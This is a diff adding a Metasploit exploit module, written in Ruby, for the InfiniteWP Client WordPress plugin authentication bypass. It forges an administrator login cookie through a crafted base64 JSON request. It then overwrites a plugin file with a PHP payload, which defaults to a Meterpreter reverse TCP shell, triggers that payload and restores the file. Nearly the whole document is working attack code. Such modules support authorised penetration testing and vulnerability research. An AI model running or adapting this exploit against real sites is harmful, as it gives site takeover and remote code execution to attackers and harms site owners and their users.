@@ -1,0 +1,177 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+
+  Rank = ManualRanking
+
+  include Msf::Exploit::Remote::HTTP::Wordpress
+  include Msf::Exploit::Remote::AutoCheck
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'WordPress InfiniteWP Client Authentication Bypass',
+      'Description'    => %q{
+        This module exploits an authentication bypass in the WordPress
+        InfiniteWP Client plugin to log in as an administrator and execute
+        arbitrary PHP code by overwriting the file specified by PLUGIN_FILE.
+
+        The module will attempt to retrieve the original PLUGIN_FILE contents
+        and restore them after payload execution. If VerifyContents is set,
+        which is the default setting, the module will check to see if the
+        restored contents match the original.
+
+        Note that a valid administrator username is required for this module.
+
+        WordPress >= 4.9 is currently not supported due to a breaking WordPress
+        API change. Tested against 4.8.3.
+      },
+      'Author'         => [
+        'WebARX', # Discovery
+        'wvu'     # Module
+      ],
+      'References'     => [
+        ['WPVDB', '10011'],
+        ['URL', 'https://www.webarxsecurity.com/vulnerability-infinitewp-client-wp-time-capsule/'],
+        ['URL', 'https://www.wordfence.com/blog/2020/01/critical-authentication-bypass-vulnerability-in-infinitewp-client-plugin/'],
+        ['URL', 'https://blog.sucuri.net/2020/01/authentication-bypass-vulnerability-in-infinitewp-client.html']
+      ],
+      'DisclosureDate' => '2020-01-14',
+      'License'        => MSF_LICENSE,
+      'Platform'       => 'php',
+      'Arch'           => ARCH_PHP,
+      'Privileged'     => false,
+      'Targets'        => [['InfiniteWP Client < 1.9.4.5', {}]],
+      'DefaultTarget'  => 0,
+      'DefaultOptions' => {'PAYLOAD' => 'php/meterpreter/reverse_tcp'}
+    ))
+
+    register_options([
+      OptString.new('USERNAME',    [true, 'WordPress username', 'admin']),
+      OptString.new('PLUGIN_FILE', [true, 'Plugin file to edit', 'index.php'])
+    ])
+
+    register_advanced_options([
+      OptBool.new('VerifyContents', [false, 'Verify file contents', true])
+    ])
+  end
+
+  def username
+    datastore['USERNAME']
+  end
+
+  def plugin_file
+    datastore['PLUGIN_FILE']
+  end
+
+  def plugin_uri
+    normalize_uri(wordpress_url_plugins, plugin_file)
+  end
+
+  def check
+    unless wordpress_and_online?
+      return CheckCode::Unknown('Is the site online and running WordPress?')
+    end
+
+    unless (version = wordpress_version)
+      return CheckCode::Unknown('Could not detect WordPress version')
+    end
+
+    if Gem::Version.new(version) >= Gem::Version.new('4.9')
+      return CheckCode::Safe("WordPress #{version} is an unsupported target")
+    end
+
+    vprint_good("WordPress #{version} is a supported target")
+
+    check_version_from_custom_file(
+      normalize_uri(wordpress_url_plugins, '/iwp-client/readme.txt'),
+      /^= ([\d.]+)/,
+      '1.9.4.5'
+    )
+  end
+
+  # https://plugins.trac.wordpress.org/browser/iwp-client/tags/1.9.4.4/init.php
+  def auth_bypass
+    json = {
+      'iwp_action' => %w[add_site readd_site].sample,
+      'params'     => {'username' => username}
+    }.to_json
+
+    res = send_request_cgi(
+      'method' => 'POST',
+      'uri'    => wordpress_url_backend,
+      'data'   => "_IWP_JSON_PREFIX_#{Rex::Text.encode_base64(json)}"
+    )
+
+    unless res && res.code == 200 && !(cookie = res.get_cookies).empty?
+      fail_with(Failure::NoAccess, "Could not obtain cookie for #{username}")
+    end
+
+    print_good("Successfully obtained cookie for #{username}")
+    vprint_status("Cookie: #{cookie}")
+
+    cookie
+  end
+
+  def exploit
+    # NOTE: Automatic check is implemented by the AutoCheck mixin
+    super
+
+    print_status("Bypassing auth for #{username} at #{full_uri}")
+    unless (@cookie = auth_bypass).include?('wordpress_logged_in')
+      fail_with(Failure::NoAccess, "Could not log in as #{username}")
+    end
+
+    print_good("Successfully logged in as #{username}")
+    write_and_exec_payload
+  end
+
+  def write_and_exec_payload
+    print_status("Retrieving original contents of #{plugin_uri}")
+    contents = wordpress_helper_get_plugin_file_contents(@cookie, plugin_file)
+
+    unless contents
+      fail_with(Failure::UnexpectedReply, "Could not retrieve #{plugin_uri}")
+    end
+
+    print_good("Successfully retrieved original contents of #{plugin_uri}")
+    vprint_status('Contents:')
+    print(contents)
+
+    print_status("Overwriting #{plugin_uri} with payload")
+    unless wordpress_edit_plugin(plugin_file, payload.encoded, @cookie)
+      fail_with(Failure::UnexpectedReply, "Could not overwrite #{plugin_uri}")
+    end
+
+    print_good("Successfully overwrote #{plugin_uri} with payload")
+
+    print_status("Requesting payload at #{plugin_uri}")
+    send_request_cgi({
+      'method' => 'GET',
+      'uri'    => plugin_uri
+    }, 0)
+
+    restore_contents(contents)
+  end
+
+  def restore_contents(og_contents)
+    print_status("Restoring original contents of #{plugin_uri}")
+    unless wordpress_edit_plugin(plugin_file, og_contents, @cookie)
+      fail_with(Failure::UnexpectedReply, "Could not restore #{plugin_uri}")
+    end
+
+    return unless datastore['VerifyContents']
+
+    contents = wordpress_helper_get_plugin_file_contents(@cookie, plugin_file)
+
+    unless contents == og_contents
+      fail_with(Failure::UnexpectedReply,
+                "Current contents of #{plugin_uri} DO NOT match original!")
+    end
+
+    print_good("Current contents of #{plugin_uri} match original!")
+  end
+
+end
